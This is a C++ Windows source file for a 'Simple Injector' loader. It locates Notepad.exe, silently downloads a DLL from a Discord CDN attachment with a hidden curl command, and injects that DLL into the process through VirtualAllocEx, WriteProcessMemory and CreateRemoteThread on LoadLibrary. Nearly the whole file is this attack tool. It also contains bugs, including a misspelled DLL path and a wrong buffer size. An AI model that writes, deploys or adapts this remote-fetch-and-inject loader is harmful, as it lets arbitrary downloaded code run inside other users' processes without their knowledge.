#include <winsock2.h>
#include <tlhelp32.h>
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;
int opc;

int getProcID(const std::string& p_name)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 structprocsnapshot = { 0 };
	structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);
	if (snapshot == INVALID_HANDLE_VALUE)return 0;
	if (Process32First(snapshot, &structprocsnapshot) == FALSE)return 0;
	while (Process32Next(snapshot, &structprocsnapshot))
	{
		if (!strcmp(structprocsnapshot.szExeFile, p_name.c_str()))
		{
			CloseHandle(snapshot);
			return structprocsnapshot.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	return 0;

}
bool isProcRunning(std::string process) {
	if (getProcID(process) == 0) {
		return false;
	}
	else
	{
		return true;
	}
}

void set_console(int w, int h) {

	HWND console = GetConsoleWindow();
	RECT r;
	GetWindowRect(console, &r);

	MoveWindow(console, r.left, r.top, w, h, TRUE);
}

int GetProcessIdByName(const std::string& p_name)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 structprocsnapshot = { 0 };

	structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

	if (snapshot == INVALID_HANDLE_VALUE)return 0;
	if (Process32First(snapshot, &structprocsnapshot) == FALSE)return 0;

	while (Process32Next(snapshot, &structprocsnapshot))
	{
		if (!strcmp(structprocsnapshot.szExeFile, p_name.c_str()))
		{
			CloseHandle(snapshot);
			return structprocsnapshot.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	return 0;

}

void loadLibrary(string process, string dllpath) {
	DWORD dwProc = GetProcessIdByName(process);
	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProc);
	LPVOID allocMem = VirtualAllocEx(hProc, NULL, sizeof(dllpath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProc, allocMem, dllpath.c_str(), sizeof(dllpath), NULL);
	CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, allocMem, 0, 0);
	CloseHandle(hProc);

}

void setupConsole(string consoletitle, int w, int h) {
	SetConsoleTitleA(consoletitle.c_str());
	set_console(w, h);

}

int main() {
	setupConsole("Loader base", 800, 500); //Output download
	cout << "                                          Simple Injector\n";
	Sleep(3000);
	pq:
	system("cls");
	system("color 4");
	cout << "                                          Simple Injector\n";
	cout << "  [1] 1.dll\n";
	cout << "  [2] 1.dll\n";
	cout << " User:";
	cin >> opc;
	system("cls");
	if (opc == 1) {
		string procname = "Notepad.exe"; //Output download
		std::ifstream ifs("C:/exemple.dll"); //check if downloaded the dll

		if (isProcRunning(procname)) {
			system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/exemple.dll --output C:/exemple.dll >nul 2>&1"); //download location, Output download
			if (ifs) { //check if downloaded the dll
				loadLibrary(procname, "C://exemple.dlll"); //where did you download the dll
				cout << "Injected dll in " << procname;
				return 0;
			}
			else {
				MessageBox(NULL, "dll n�o encontrada!", "Erro 002", MB_ICONERROR); //Error message, if the dll was not found
				goto pq;
			}
		}
		else {
			MessageBox(NULL, "Processo n�o achado!", "Erro 001", MB_ICONERROR); //Error message, if the process was not found
			goto pq;
		}
	}
	else if (opc == 2) {
		string procname = "Notepad.exe"; //Output download
		std::ifstream ifs("C:/exemple.dll"); //check if downloaded the dll

		if (isProcRunning(procname)) {
			system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/exemple.dll --output C:/exemple.dll >nul 2>&1"); //download location, Output download
			if (ifs) { //check if downloaded the dll
				loadLibrary(procname, "C://exemple.dlll"); //where did you download the dll
				cout << "Injected dll in " << procname;
				return 0;
			}
			else {
				MessageBox(NULL, "dll n�o encontrada!", "Erro 002", MB_ICONERROR); //Error message, if the dll was not found
				goto pq;
			}
		}
		else {
			MessageBox(NULL, "Processo n�o achado!", "Erro 001", MB_ICONERROR); //Error message, if the process was not found
			goto pq;
		}
	}
	else {
		MessageBox(NULL, "Opc Indisponivel", "Error", MB_ICONERROR); //if the option was wrong
		goto pq;
	}

	return 0;
}